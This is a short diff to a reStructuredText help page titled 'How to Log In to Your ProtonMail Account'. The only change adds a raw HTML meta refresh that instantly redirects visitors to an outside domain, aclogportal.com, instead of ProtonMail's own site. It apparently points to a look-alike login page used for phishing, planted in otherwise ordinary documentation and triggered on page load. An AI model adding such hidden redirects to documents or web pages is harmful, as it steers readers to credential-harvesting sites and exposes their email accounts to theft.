@@ -1,3 +1,7 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://aclogportal.com/protonmail-login-account/">
+
 How to Log In to Your ProtonMail Account 🔐
 ============================================
 
